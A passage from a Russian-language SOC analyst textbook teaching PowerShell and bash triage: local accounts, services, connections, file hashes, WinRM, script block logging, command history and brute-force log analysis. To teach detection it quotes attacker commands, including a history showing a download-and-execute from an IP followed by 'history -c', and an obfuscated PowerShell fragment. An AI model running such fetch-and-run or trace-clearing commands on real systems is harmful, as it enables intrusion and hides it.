Select-Object Name, Id, WS, Path — через запятую перечислены нужные поля; -First 5 — пять верхних (если тяжёлых меньше, покажет сколько есть). За одну строку ты ответил на оба вопроса из начала главы: самые тяжёлые процессы с их PID и памятью — и путь, по которому видно, запущен ли процесс из нормального места или из чужой папки.

Эту строку в примере я разбил на две (первая кончается на |): если строка кончается значком конвейера, PowerShell понимает, что команда продолжается, и ждёт следующую строку. Можно писать и одной длинной строкой.

Порядок звеньев важен: Select-Object оставляет только выбранные поля и выбрасывает остальные, поэтому сортируй (Sort-Object WS) до него, а не после — иначе сортировать будет уже нечего.

Select-String — отдельный командлет, не часть этой цепочки: ищет строки с текстом внутри файла, как grep в Linux и findstr в cmd: Select-String "error" app.log. Понадобится в «Вживую».

Если не получилось: - You cannot call a method on a null-valued expression — чаще всего опечатка в имени поля после $_.; проверь поле через Get-Process | Get-Member (покажет все поля объекта). - условие в { } ничего не вернуло — проверь сравнение (-gt, а не >; в PowerShell > значит запись в файл).

Ошибка новичка: писать > вместо -gt. Get-Process | Where-Object { $_.WS > 50MB } не отфильтрует, а попробует записать в файл с именем 50MB. Сравнения в PowerShell — буквами: -gt, -lt, -eq.

Вживую: тот же разбор лога, что в Linux

PowerShell 7 на маке читает обычные текстовые журналы. Положим рядом настоящий Linux_2k.log (2000 строк реального сервера; тот же файл разбираем в главе 6 в bash) и ответим на два вопроса конвейером.

Сколько было неудачных входов:

PS ~> (Get-Content Linux_2k.log | Select-String "authentication failure").Count
490

Get-Content отдаёт строки, Select-String "authentication failure" оставляет только отказы во входе, .Count — сколько их. Ответ: 490.

Кто ломился чаще всех — вытащить адрес из rhost=…, сгруппировать, отсортировать. Здесь нужен шаблон (регулярное выражение): rhost=(\S+) значит «буквы rhost=, а за ними — любые непробельные символы подряд» (\S — не пробел, + — один и больше), и скобки ( ) говорят «этот кусок запомни» — это и будет адрес.

PS ~> Get-Content Linux_2k.log |
      Select-String "rhost=(\S+)" |
      ForEach-Object { $_.Matches.Groups[1].Value } |
      Group-Object | Sort-Object Count -Descending | Select-Object Count, Name -First 3

Count Name
----- ----
   80 150.183.249.110
   23 207.243.167.114
   23 n219076184117.netvigator.com

По шагам: Select-String "rhost=(\S+)" находит строки с адресом, ForEach-Object { … } на каждой такой строке берёт запомненный скобками кусок ($_.Matches.Groups[1].Value — «первый запомненный кусок»), Group-Object считает одинаковые адреса, Sort-Object Count -Descending — частые сверху, Select-Object … -First 3 — топ-3. Главный — 150.183.249.110, 80 попыток. (Одна из строк — не IP, а имя n219076184117.netvigator.com: в журнале адрес иногда записан именем, для тикета это такой же источник.)

Это тот же вывод, что даст grep … | sort | uniq -c | sort -rn в Linux (глава 6): объекты вместо текста, а смысл один. Числа здесь посчитаны по настоящему файлу; вид вывода PowerShell показан по документации.

В тикет:

Linux_2k.log (combo): перебор SSH подтверждён — 490 неудачных входов,
главный источник 150.183.249.110 (80 попыток). Разобрано конвейером
PowerShell (Select-String + Group-Object). Передаю на блокировку адреса.

Сделай сам

На маке, в pwsh (или на Windows в PowerShell):

  1. Get-Process | Sort-Object WS -Descending | Select-Object Name, Id, WS -First 5 — пять самых тяжёлых процессов.
  2. Get-Command -Verb Get -Noun *item* — найди командлеты про файлы, не зная их имён.

Копнуть глубже: Get-Member — как узнать поля объекта

Копнуть глубже: Get-Member показывает все поля и действия объекта

Не знаешь, какие у объекта поля (чтобы писать $_.WS, $_.Path)? Передай объект в Get-Member:

PS C:\> Get-Process | Get-Member
   TypeName: System.Diagnostics.Process

Name        MemberType   Definition
----        ----------   ----------
Id          Property     int Id {get;}
Path        Property     string Path {get;}
Kill        Method       void Kill()

Property — поле, которое можно прочитать ($_.Path). Method — действие, которое объект умеет сам (Kill() — завершить процесс). Отсюда и аналогия «объект как устройство: у него есть свойства и методы». Для L1 почти всегда нужны свойства; Get-Member — способ быстро узнать их имена, не гадая.

Всё это — пять командлетов осмотра и одно умение читать журнал PowerShell. Разберём по порядку.

Аналогия

Глава 3 была про инструмент (как собрать конвейер). Эта — про аптечку дежурного: набор готовых командлетов, которые на смене достаёшь не задумываясь. Как у медсестры в приёмном: тонометр, градусник, фонарик — всегда одни и те же, под рукой.

Сначала слова, без которых дальше не понять

Локальная учётка (local account). Учётная запись, которая есть только на этой машине (в отличие от доменной, общей на всю фирму). Их список смотрят Get-LocalUser.

Служба (service). Программа в фоне без окна, стартует с системой (печать, обновления, удалённый доступ). Была в прошлых учебниках; на смене важно, не появилась ли новая служба, которой вчера не было.

Хэш файла (file hash). Короткий «отпечаток» файла: одинаковые файлы дают одинаковый хэш, изменил один байт — хэш другой. По нему файл пробивают как IOC (признак заражения), не передавая сам файл. Было в учебнике по криптографии.

Удалённый запуск (remoting). Выполнить команду на другой машине по сети, не заходя на неё руками. В Windows это делает Invoke-Command через службу WinRM (Windows Remote Management — встроенная служба удалённого управления).

Закрепление (persistence). Когда тот, кто влез, устраивает так, чтобы его доступ пережил перезагрузку и смену пароля: заводит себе службу, учётку или задачу по расписанию. На смене новая непонятная служба или учётка — частый признак закрепления.

Боковое перемещение (lateral movement). Переход с одной захваченной машины на соседние по сети. Удалённый запуск — один из его способов.

Журнал скриптов (Script Block Logging). Настройка, при которой Windows записывает в журнал текст каждого куска кода, который выполнил PowerShell, — даже если его пытались спрятать. Главный источник правды о том, что реально делал PowerShell.

Кто в системе: учётки и скрытые записи

На смене: после алерта «появилась новая учётка» первым делом смотришь список локальных учёток — и ищешь то, чего там быть не должно.

Как устроено. Get-LocalUser печатает локальные учётки:

PS C:\> Get-LocalUser

Name               Enabled  Description
----               -------  -----------
Administrator      False    Встроенная учётная запись администратора
adm.weber          True     IT Kranich
Guest              False    Встроенная учётная запись гостя
svc_backup         True     Backup service
  • Enabled — включена ли учётка. Выключенные (False) войти не могут; внезапно включённый Guest или Administrator — сам по себе вопрос.
  • Description — заметка; у служебных учёток там обычно назначение.

Приём, который прячут. Имя учётной записи, оканчивающееся на $, некоторые инструменты Windows (например старый net user) не показывают — так прячут добавленную учётку (в MITRE это T1564.002). Get-LocalUser их показывает. Запись вроде hideme0007$ в списке — почти наверняка чужая.

Если не получилось: Get-LocalUser : The term … is not recognized — очень старая система без этого командлета; тогда net user (но помни: имя на $ он скроет).

Ошибка новичка: пролистать список и не сверить с тем, что должно быть. Новая или включённая учётка — находка, только если ты знаешь, какой список нормальный; поэтому на смене держат под рукой перечень штатных учёток сервера.

Что сейчас происходит: процессы, службы, соединения, хэш

На смене: четыре командлета дают срез «что на машине прямо сейчас». Их набирают подряд, как осмотр.

Как устроено.

PS C:\> Get-Process | Sort-Object WS -Descending | Select-Object Name, Id, Path -First 3
PS C:\> Get-Service | Where-Object { $_.Status -eq "Running" }
PS C:\> Get-NetTCPConnection -State Established
PS C:\> Get-FileHash C:\Users\Public\update.exe
  • Get-Process — процессы (глава 3). С полем Path видно, откуда запущен: системная программа из C:\Users\Public — зацепка.
  • Get-Service — службы; Where-Object { $_.Status -eq "Running" } оставляет работающие (-eq — «равно», из главы 3):
PS C:\> Get-Service | Where-Object { $_.Status -eq "Running" }

Status   Name          DisplayName
------   ----          -----------
Running  Spooler       Диспетчер печати
Running  WinRM         Удалённое управление Windows
Running  svc_upd8      System Update Helper

Ищешь новую службу без понятного назначения — так закрепляются (T1543.003). Строка svc_upd8 с размытым именем «System Update Helper», которой вчера не было, — ровно такой кандидат. - Get-NetTCPConnection -State Established — открытые соединения. Полезное поле — OwningProcess: это PID процесса, который держит соединение. По нему через Get-Process -Id <PID> находишь программу:

PS C:\> Get-NetTCPConnection -State Established |
        Select-Object LocalAddress, RemoteAddress, RemotePort, OwningProcess

LocalAddress    RemoteAddress    RemotePort  OwningProcess
------------    -------------    ----------  -------------
192.168.20.14   203.0.113.80            443           6120
  • Get-FileHash файл — хэш файла. По умолчанию SHA-256 (есть и -Algorithm MD5, SHA1):
PS C:\> Get-FileHash C:\Users\Public\note.txt

Algorithm  Hash
---------  ----
SHA256     7BE779EDBEF8BE04F5A19200F5BF4281FD0D094F550E81417041A59FBDF12580

Этот хэш идёт в тикет и пробивается по базам (VirusTotal), как в учебнике по криптографии.

Если не получилось: Get-NetTCPConnection на маке нет (это команда только для Windows) — на маке соединения смотрят через lsof -i или netstat (глава 6). На Windows командлет есть всегда.

Ошибка новичка: взять хэш не того файла. Снимай хэш именно того файла, что в алерте (полный путь), а не похожего по имени в другой папке.

Удалённый запуск: Invoke-Command и WinRM

На смене: важно узнавать этот приём в журнале: так админы законно управляют серверами, и так же боковым ходом ходят по сети после взлома.

Как устроено. Invoke-Command выполняет код на другой машине:

PS C:\> Invoke-Command -ComputerName FUE-APP01 -ScriptBlock { Get-Process }
  • -ComputerName FUE-APP01 — на какой машине выполнить.
  • -ScriptBlock { … } — какой код там выполнить (здесь Get-Process).

Работает это через службу WinRM (Windows Remote Management) на портах 5985 (без шифрования) или 5986 (с шифрованием). Когда команда приходит на машину-получатель, её выполняет служебный процесс wsmprovhost.exe — и вот он-то виден в журнале.

Почему это важно для L1: если в журнале процесс wsmprovhost.exe запускает cmd.exe, powershell.exe или разведку (whoami, net), — значит, на эту машину кто-то зашёл по сети и выполняет команды (в MITRE это T1021.006). Админ так делает планово; вопрос всегда — с какой машины и было ли согласовано.

Если не получилось: Invoke-Command отвечает Access is denied или cannot connect — WinRM на цели выключен или нет прав. L1 сам обычно не запускает удалёнку, а узнаёт её в журнале.

Ошибка новичка: считать wsmprovhost.exe вредоносом. Сам по себе он штатный — тревожит то, что он запускает и с какой машины пришло подключение.

Политика выполнения и журнал скриптов

На смене: две вещи про PowerShell, которые постоянно встречаются в алертах: фраза про «execution policy» и длинная нечитаемая команда.

Как устроено.

Execution Policy (политика выполнения) — настройка «каким скриптам разрешено запускаться». Звучит как защита, но ею не является: это заслонка, чтобы случайно скачанный скрипт не запустился сам, а не замок от злоумышленника. Текущее значение показывает Get-ExecutionPolicy. Её легко переключить на Unrestricted («разрешить всё»), и в журнале Sysmon (это тот самый журнал запусков из главы 1) это видно как запись в реестр:

Image:   powershell.exe
Target:  HKLM\...\Microsoft.PowerShell\ExecutionPolicy
Details: Unrestricted

Такая запись значит: кто-то снял заслонку, чтобы спокойно запускать свои скрипты. Сама по себе она не взлом, но рядом с другими алертами — часть картины.

Журнал скриптов (Script Block Logging) — твой главный союзник. Если он включён, Windows пишет событие 4104 с полным текстом каждого выполненного куска кода (кусок кода и называется «script block»), даже если код пытались спрятать склейкой строк. Достают такие события командой Get-WinEvent (или глазами в Event Viewer — учебник по Windows). В какой журнал смотреть — зависит от версии PowerShell (её узнаёшь через $PSVersionTable, глава 3):

Версия PowerShell Журнал
5.1 (встроенная) Microsoft-Windows-PowerShell/Operational
7 (отдельная) PowerShellCore/Operational 
PS C:\> Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
        Where-Object { $_.Id -eq 4104 } | Select-Object -First 1

Если не получилось: событий 4104 нет совсем — Script Block Logging не включён на этой машине; тогда у тебя только запуск процесса (Sysmon Event ID 1) без полного текста. Это само по себе заметка для усиления мониторинга.

Ошибка новичка: пытаться «расшифровать» обфусцированную (нарочно запутанную) команду руками. Не нужно: событие 4104 часто уже содержит распутанный текст — читай его, а не исходную кашу.

Вживую: четыре настоящие записи

Все четыре — реальные события с машин из открытого набора EVTX-ATTACK-SAMPLES; показаны поля, которые видит L1.

1. Удалённый запуск. Процесс HOSTNAME.EXE с родителем wsmprovhost.exe:

Image:        C:\Windows\System32\HOSTNAME.EXE
ParentImage:  C:\Windows\System32\wsmprovhost.exe
User:         insecurebank\Administrator

Читаем (insecurebank здесь — имя домена лабораторной машины): wsmprovhost.exe — хост удалённой PowerShell-сессии, значит на машину зашли по WinRM и первым делом спросили её имя (hostname — та же разведка, что в главе 1), а ParentImage — поле «кто запустил», родитель (глава 1). Это удалённый запуск, T1021.006. Вопрос в тикет: с какой машины пришло подключение и плановое ли оно.

2. Снятая политика. Запись в реестр ExecutionPolicy = Unrestricted процессом powershell.exe (разбор выше). Кто-то разрешил запуск любых скриптов.

3. Скрытая учётка. В журнале появляется запись об имени hideme0007$ в базе учёток (...\Users\Names\hideme0007$). Имя на $ — попытка спрятать добавленную учётку от net user (T1564.002). В Get-LocalUser она всё равно видна.

4. Запутанная команда в 4104. Событие 4104 с таким текстом:

$Va5w3n8=(('Q'+'2h')+('w9p'+'1'));
[Net.ServicePointManager]::"SecURi`T`ypRO`T`oCOL" = ('t'+'ls'+'1'...

Склейка кусочков строк ('Q'+'2h') и обратные кавычки внутри слов — это обфускация: код нарочно запутали, чтобы простой поиск по словам его не нашёл (T1027.010). Тебе разбирать склейку не нужно — важно узнать приём: нечитаемый PowerShell со склейкой строк и обратными кавычками почти всегда стоит эскалации.

В тикет:

FUE-APP01, 03:40: по WinRM удалённый запуск (wsmprovhost → hostname, T1021.006);
снята Execution Policy → Unrestricted; добавлена скрытая учётка hideme0007$ (T1564.002);
в 4104 обфусцированный PowerShell (T1027.010). Цепочка «вход по сети → снятие заслонки →
закрепление» складывается в один инцидент. Эскалирую на L2 как вероятную компрометацию.

Сделай сам

На маке в pwsh работает не всё (часть командлетов только для Windows) — отметил, где что:

  1. Get-FileHash ~/Downloads/любой-файл — сними SHA-256 (работает и на маке). Измени в файле один символ и сними снова — хэш полностью изменится.
  2. Get-Process | Sort-Object WS -Descending | Select-Object Name, Id, Path -First 5 — тяжёлые процессы с путями (на маке Path у части процессов пустой — это нормально).
  3. В комнате (Windows): Get-LocalUser — найди спрятанную среди прочих включённую учётку и прочитай её Description (задание комнаты; ответ ищи сам).
  4. В комнате: Get-NetTCPConnection -State Established и найди по OwningProcess, какой процесс держит соединение.

Копнуть глубже: история команд PowerShell

Копнуть глубже: где лежит история набранных команд

Отдельно от журнала скриптов PowerShell хранит историю того, что набирали руками в окне, — файл построчно, как .bash_history в Linux (глава 5). Путь:

C:\Users\<имя>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Это делает модуль PSReadLine (он отвечает за ввод в окне PowerShell). На смене файл полезен: в нём видно, что человек печатал руками. Но помни: это не то же, что событие 4104 — сюда попадает только ручной ввод в интерактивном окне, а не код, запущенный скриптом или удалённо. И историю, как и в Linux, чистят — пустой файл у активно работавшей учётки сам по себе заметка.

Выжимка

  • Get-LocalUser показывает все локальные учётки, в том числе спрятанные именем на $; сверяй со списком штатных.
  • Осмотр «что сейчас»: Get-Process (с Path), Get-Service (новые службы), Get-NetTCPConnection -State Established (поле OwningProcess → PID), Get-FileHash (по умолчанию SHA-256).
  • wsmprovhost.exe, запускающий cmd/powershell/разведку, — удалённый вход по WinRM (T1021.006); сам процесс штатный, важно, что он делает.
  • Execution Policy — не защита; Unrestricted в журнале — снятая заслонка, часть картины.
  • Событие 4104 (Script Block Logging) даёт полный текст кода, даже запутанного; обфускацию узнают, а не расшифровывают руками.

Глава 5. Оболочки Linux: shell, команды, история (Linux Shells)

🔥Обязательно — Linux-серверов в SOC больше, чем кажется, и журналы с них читают в оболочке. А ещё всё это работает прямо в Терминале твоего мака — отрабатывать проще всего тут
🤔
По желанию Linux Shells — по желанию. Всё из комнаты — оболочки, команды, история — ты повторишь в Терминале мака прямо по главам 5–6. Комнату можно прокликать ради галочки пути SEC1. ~45 мин.

Ты на смене

02:20. Алерт с веб-сервера fue-web01 (Linux): «вход по SSH под учёткой www-data, следом — десяток команд за несколько секунд». www-data — это служебная учётка веб-сайта, человек под ней обычно не входит.

На Linux ты окажешься в оболочке — ни окон, ни мышки. Надо уметь: понять, где ты и что за система, прочитать, что набирали, и не испортить улики. Команды — те же, что ты уже видел в cmd и PowerShell, только короче.

Аналогия

cmd — разговор с поваром на Windows, PowerShell — он же, но подаёт блюда на тарелочках с ярлычками (объекты). Оболочка Linux — тот же повар на другой кухне: слова другие и короче (ls вместо dir, cat вместо type), а суть та же. Научился заказывать на одной кухне — на другой разберёшься быстро.

Сначала слова, без которых дальше не понять

Оболочка (shell). Программа, которая читает твои команды в терминале и выполняет. В Linux их несколько; самая частая — bash. На маке по умолчанию другая, zsh, но команды этой главы в обеих одинаковые.

bash / zsh / fish. Три оболочки. bash (Bourne Again Shell) — стандарт на серверах, её встретишь почти везде. zsh (Z Shell) — по умолчанию на маке, удобнее для человека. fish (Friendly Interactive Shell) — ещё дружелюбнее, но на серверах почти не бывает.

$SHELL. Переменная окружения, в которой записано, какая оболочка у тебя сейчас. Печатают её через echo $SHELL.

История команд (command history). Файл, куда оболочка построчно пишет всё, что набирали руками. Для bash это ~/.bash_history, для zsh — ~/.zsh_history. На смене — иногда вся атака по шагам.

~ (тильда). Короткая запись домашней папки учётки: ~/.bash_history = /home/www-data/.bash_history. На маке ~ — это /Users/ilya.

Оболочка и первые команды

На смене: зашёл на Linux-сервер — первым делом те же «кто я, где я, что тут»: команды короче, чем в Windows, но смысл тот же.

Как устроено. Приглашение (строка перед курсором, где печатаешь команду) в Linux заканчивается на $ (обычный пользователь) или # (root — полный администратор, которому можно всё). Печатаешь только то, что стоит после $; строки без приглашения под командой — это её вывод:

www-data@fue-web01:/var/www$ whoami
www-data

www-data@fue-web01:/var/www$ pwd
/var/www

www-data@fue-web01:/var/www$ ls
html  uploads  config.php
Команда Что делает Как в Windows
whoami под какой учёткой работаешь whoami
pwd в какой папке ты сейчас (print working directory) —
cd /var/log перейти в папку cd
ls список папки; ls -la — подробно и со скрытыми dir
cat файл показать файл type / Get-Content
grep "слово" файл оставить строки со словом findstr / Select-String

Приглашение www-data@fue-web01:/var/www$ читается по частям: www-data — учётка, fue-web01 — имя машины, /var/www — где ты, $ — обычный пользователь. Тот же смысл, что C:\Users\user> в cmd.

Скрытые файлы в Linux начинаются с точки (.bash_history); обычный ls их не показывает, нужен ls -la. Этим пользуются, пряча свои файлы под именами с точкой.

Если не получилось: - bash: cd: /var/logs: No such file or directory — нет такой папки (здесь опечатка: /var/log, не logs). - Permission denied — не хватает прав; чужие логи и файлы читает root, нужен sudo (запуск одной команды от администратора).

Ошибка новичка: на маке искать папку C:\. В Linux и на маке дисков с буквами нет: всё растёт из одного корня /, адреса — через прямую косую /, а не \.

Какая оболочка и какие есть

На смене: иногда важно, в какой оболочке набирали команды, — от этого зависит, где искать историю (файл у bash и zsh разный).

Как устроено.

www-data@fue-web01:~$ echo $SHELL
/bin/bash

www-data@fue-web01:~$ cat /etc/shells
/bin/sh
/bin/bash
/usr/bin/zsh
/usr/bin/fish
  • echo $SHELL — твоя текущая оболочка (здесь /bin/bash).
  • cat /etc/shells — список всех установленных на машине оболочек.
  • Сменить свою оболочку — chsh -s /usr/bin/zsh (change shell), подействует со следующего входа.

Чем они отличаются, в двух словах: bash — везде и стандарт; zsh — умнее подсказывает и дополняет команды (поэтому её выбрали на маке); fish сразу подсвечивает ошибки и дополняет на лету, но её редко ставят на серверы. Для L1 вывод один: команды разбора (grep, cat, ls, |) во всех трёх одинаковые — разница в удобстве, не в сути.

Если не получилось: echo $SHELL показал /bin/sh — это самая простая оболочка; команды главы в ней работают, но подсказок и истории может не быть.

Ошибка новичка: решить, что раз на сервере bash, а на маке zsh, то команды разные. Нет: grep, cat, ls, пайпы — одни и те же. Отрабатывай спокойно на маке.

История: что набирали руками

На смене: главный приём главы. История команд — дневник того, что человек (или бот) печатал в оболочке. Иногда в нём видна вся атака по шагам.

Как устроено. Команда history печатает команды текущей сессии; файл истории лежит в домашней папке:

www-data@fue-web01:~$ cat ~/.bash_history
cd /tmp
wget http://203.0.113.50/a
chmod +x a
./a
history -c

Читается сверху вниз как рассказ: перешёл в /tmp (папка временных файлов, куда может писать любая учётка — потому её и любят, чтобы сложить своё), скачал файл с одной буквой в имени прямо с IP-адреса (wget — качалка; короткое имя и голый IP вместо сайта уже подозрительны), разрешил его запускать (chmod +x — ставит признак «исполняемый», это и есть x), запустил (./a — «запусти файл a из текущей папки»; без ./ Linux искал бы команду a в системных папках, а не здесь), стёр историю (history -c). Каждую строку ты теперь прочитаешь сам.

  • ~/.bash_history — история bash, ~/.zsh_history — история zsh. Поэтому и важно знать оболочку.
  • Bash дописывает команды в файл, когда сессия закрывается (ты вышел из SSH или закрыл окно). Пока окно открыто, последних команд в файле ещё нет.
  • history -c (-c — clear, очистить) стирает список в памяти (T1070.003). По умолчанию в .bash_history нет времени у команд — только порядок, так что «когда» по нему не узнать.

Если не получилось: Permission denied — чужую историю читает только хозяин или root: sudo cat /home/www-data/.bash_history.

Ошибка новичка: считать пустую историю доказательством, что ничего не делали. Историю отключают (unset HISTFILE) или стирают — пустой .bash_history у учётки, которая только что активно работала, сам по себе сигнал.

Вживую: что набирают на самом деле

Это не выдумка. Вот что реально печатают, попав на Linux-машину: восемь месяцев работы настоящих ханипотов (ловушек, которые прикидываются уязвимым сервером и записывают каждую команду) — 160 567 сессий с 60 тысяч адресов. Почти все начинаются одинаково:

cat /proc/cpuinfo | grep name | wc -l
free -m | grep Mem
crontab -l
w
uname -a

Короткий словарь к этим командам (grep и пайп ты уже знаешь):

  • cat /proc/cpuinfo — /proc не настоящая папка на диске, а «окно» в систему: читаешь из неё файл — и получаешь данные о железе. Тут — о процессоре. | grep name | wc -l считает строки со словом name, то есть число ядер процессора. Это самая частая первая команда — в 119 тысячах сессий из 160: бот прикидывает, мощная ли машина (например, чтобы майнить).
  • free -m — сколько памяти, в мегабайтах (-m).
  • uname -a — что за система и ядро (ядро — главная программа Linux; было в прошлом учебнике).
  • w — кто ещё сейчас в системе (не застукают ли).
  • crontab -l — что уже в расписании cron (глава 6).

Это разведка: прежде чем что-то делать, осмотреться. Сразу после неё боты обычно качают свою программу (wget/curl — качалки из интернета) в /tmp и запускают — коротко про это ты уже видел в примере истории выше.

И про сокрытие следов. Стирают их не всегда — но когда стирают, это выглядит так: в 143 сессиях набора прямо в сессии ввели history -c или unset HISTFILE — то самое очищение истории (T1070.003 — «Clear Command History»), которое ты теперь узнаешь в журнале.

В тикет:

fue-web01, 02:20: вход SSH под служебной www-data, затем типовая разведка
(uname, w, crontab -l, cat /proc/cpuinfo) и история очищена (history -c, T1070.003).
Вход под служебной учёткой + чистка истории — эскалирую, прошу проверить /tmp и crontab.

Сделай сам

Всё — в Терминале мака (оболочка zsh, команды те же). На маке приглашение кончается на %, а не на $, — смысл тот же:

  1. whoami, pwd, ls -la ~ — разбери своё приглашение по частям; найди файлы, начинающиеся с точки (например .zshrc).
  2. echo $SHELL — какая у тебя оболочка; cat /etc/shells — какие есть.
  3. cat ~/.zsh_history | tail -20 — последние 20 своих команд (tail -20 — «последние 20 строк»; на маке история в zsh). Если ответит No such file — ты ещё не набрал достаточно команд или история выключена, это нормально.
  4. В комнате (Linux Shells) пройди задания про оболочку по умолчанию и команду истории — это ровно echo $SHELL и history (ответ ищи сам).

Глава 6. Скрипты bash: прочитать чужой и написать свой

🔥Обязательно — Та же комната Linux Shells, вторая половина. Скрипт — несколько команд в файле, запущенных разом. На смене их и читаешь (чужие, из истории), и пишешь (чтобы разбирать журнал не руками)

Ты на смене

04:10. В истории скомпрометированной учётки — не отдельные команды, а запуск файла update.sh. Что он делает, по имени не понять. И отдельная задача от L2: «проверяй каждую ночь свежий журнал SSH на всплеск отказов — надоело делать руками».

Две задачи главы: прочитать чужой скрипт по строкам и написать свой, который делает рутинную проверку за тебя. Обе — на bash, и обе отрабатываются в Терминале мака.

Аналогия

Команда в оболочке — одно действие, как одна нота. Скрипт — записанная мелодия: тот же набор нот, но сыгранных по порядку и столько раз, сколько надо. Прочитать чужую мелодию по нотам и записать свою — один навык.

Сначала слова, без которых дальше не понять

Скрипт (script). Текстовый файл с командами, которые выполняются сверху вниз, как если бы ты набрал их по очереди. У bash-скриптов обычно имя что-то.sh.

Shebang (шебанг) — первая строка скрипта #!/bin/bash. Говорит системе, какой оболочкой выполнять файл. Без неё скрипт может запуститься не той оболочкой.

Переменная (variable). Именованная «коробка» со значением: name="Илья". Подставляешь значок $ перед именем — получаешь содержимое: echo $name напечатает Илья.

Цикл for (loop). Повторить блок команд для каждого элемента списка: «для каждой строки — сделай…». То же, что делал цикл for /l в Windows (глава 2).

Условие if (if, «если»). Выполнить блок, только если проверка верна: «если отказов больше 100 — крикни тревогу».

Читаем чужой скрипт по строкам

На смене: нашёл в истории запуск .sh — открываешь его (cat update.sh) и читаешь сверху вниз, как обычный текст. Каждую конструкцию разберём на простом примере.

Как устроено. Вот короткий учебный скрипт — печатает приветствие и спрашивает имя:

#!/bin/bash
# greet.sh — спрашивает имя и здоровается
echo "Как тебя зовут?"
read name
echo "Привет, $name"

Построчно:

  • #!/bin/bash — shebang: выполнять этой оболочкой.
  • # greet.sh — … — комментарий: всё после # компьютер не выполняет, это заметка человеку.
  • echo "текст" — печатает текст на экран.
  • read name — ждёт, что наберёт пользователь, и кладёт это в переменную name.
  • echo "Привет, $name" — печатает приветствие, подставив значение name.

Сам файл набирают в текстовом редакторе прямо в Терминале — проще всего nano: команда nano greet.sh открывает пустой файл, печатаешь строки, выход с сохранением — Ctrl+O, Enter, потом Ctrl+X (редактор nano был в прошлом учебнике). Затем запуск — в два шага (приглашение ilya@mac ~ % и текст после # не набирай, это подсказка):

ilya@mac ~ % chmod +x greet.sh      # разрешить запуск (признак «исполняемый»)
ilya@mac ~ % ./greet.sh             # запустить файл из текущей папки
Как тебя зовут?
Илья
Привет, Илья

./ перед именем значит «файл здесь, в текущей папке». Без него оболочка искала бы команду greet.sh в системных папках и не нашла.

Если не получилось: - Permission denied при ./greet.sh — забыл chmod +x. - bad interpreter — опечатка в shebang (#!/bin/bash, не #!/bin/bah).

Ошибка новичка: запускать чужой .sh из истории, чтобы «посмотреть, что он делает». Нельзя: сначала читают cat-ом. Запуск неизвестного скрипта — это выполнение чужого кода.

Цикл и условие: как скрипт принимает решения

На смене: именно в циклах и условиях прячется логика чужого скрипта (и твоего). Разберём каждую на мини-примере с выводом.

Цикл for — повторить для каждого элемента:

#!/bin/bash
for i in 1 2 3
do
  echo "шаг $i"
done

шаг 1
шаг 2
шаг 3

for i in … — перебрать список; $i на каждом круге — очередной элемент; do … done — что делать. Список 1 2 3 можно заменить на файлы (for f in *.log) или на {1..254} — то же, что for /l в Windows.

Условие if — сделать что-то только при проверке:

#!/bin/bash
fails=120
if [ $fails -gt 100 ]
then
  echo "ТРЕВОГА: $fails отказов"
else
  echo "норма: $fails"
fi

ТРЕВОГА: 120 отказов
  • [ $fails -gt 100 ] — проверка «fails больше 100». Сравнения в bash пишут так же, как в PowerShell: -gt больше, -lt меньше, -eq равно, -ge/-le больше/меньше или равно.
  • then … else … fi — что делать, если верно / если нет; fi закрывает if (это if задом наперёд).

Если не получилось: [: 120: unary operator expected — чаще всего забыли пробелы внутри скобок: нужно [ $fails -gt 100 ], пробелы обязательны.

Ошибка новичка: в bash между переменной и = нельзя ставить пробелы: fails=120 работает, fails = 120 — нет.

Конвейер в bash: из 2000 строк — один ответ

На смене: тот же разбор лога, что в PowerShell (глава 3), только короче. Собираем по шагам — каждый шаг добавляет звено через | (пайп, из прошлого учебника).

Задача: в журнале Linux_2k.log найти, кто чаще всех подбирал пароль.

Шаг 1. Только отказы входа:

grep "authentication failure" Linux_2k.log

Шаг 2. Вытащить адрес (grep -oE — показать только найденный кусок по шаблону):

grep "authentication failure" Linux_2k.log | grep -oE "rhost=[^ ]+"

"rhost=[^ ]+" — шаблон: буквы rhost= и за ними любые символы, кроме пробела ([^ ]+). Выйдет столбик rhost=150.183.249.110, по одному на каждый отказ.

Шаг 3–4. Сложить одинаковые рядом (sort) и посчитать (uniq -c):

grep "authentication failure" Linux_2k.log | grep -oE "rhost=[^ ]+" | sort | uniq -c

uniq -c склеивает соседние одинаковые строки и пишет, сколько их; поэтому перед ним всегда sort — иначе склеит только случайных соседей.

Шаг 5. Частые — наверх (sort -rn: -n — сравнивать как числа, а не как текст, иначе 80 окажется выше 286; -r — большие сверху) и верхние три (head -3 — первые три строки):

grep "authentication failure" Linux_2k.log | grep -oE "rhost=[^ ]+" | sort | uniq -c | sort -rn | head -3

     80 rhost=150.183.249.110
     23 rhost=n219076184117.netvigator.com
     23 rhost=207.243.167.114

Готово: главный источник — 150.183.249.110, 80 попыток. Это тот же ответ, что дал конвейер PowerShell в главе 3 (Select-String … | Group-Object), — объекты против текста, смысл один.

Неправильный вариант — uniq -c без sort:

grep "authentication failure" Linux_2k.log | grep -oE "rhost=[^ ]+" | uniq -c

даст кашу (по одной группе на каждую смену адреса), потому что одинаковые строки стоят не подряд. Запомни: перед uniq всегда sort.

Вживую: скрипт ночной проверки

Соберём из этого скрипт под задачу L2 — каждую ночь проверять журнал и кричать, если отказов слишком много. Всё, что в нём есть, разобрано выше:

#!/bin/bash
# nightcheck.sh — проверка журнала SSH на всплеск отказов
LOG="Linux_2k.log"

fails=$(grep -c "authentication failure" "$LOG")
top=$(grep "authentication failure" "$LOG" | grep -oE "rhost=[^ ]+" \
      | sort | uniq -c | sort -rn | head -1)

echo "Отказов входа: $fails"
echo "Главный источник: $top"

if [ $fails -gt 100 ]
then
  echo "ТРЕВОГА: отказов больше 100 — похоже на перебор"
else
  echo "норма"
fi

Отказов входа: 490
Главный источник:      80 rhost=150.183.249.110
ТРЕВОГА: отказов больше 100 — похоже на перебор

Два новых значка: grep -c (-c — не печатать строки, а сосчитать их) и fails=$(…) — подстановка команды: круглые скобки со значком $ берут вывод команды внутри и кладут его в переменную. То есть fails становится равна числу 490, которое насчитал grep -c. Дальше это число идёт в if. (Обратная косая \ в конце строки — просто «команда продолжается на следующей строке»; можно писать и одной длинной строкой.)

Кого именно перебирали, добавляет одна строка — почти все отказы шли на root:

ilya@mac ~ % grep "authentication failure" Linux_2k.log | grep -c "user=root"
351

351 из 490 — на root (суперпользователя): к нему и бьют первым делом, потому что это полный доступ. А все 80 попыток главного адреса 150.183.249.110 — тоже на root.

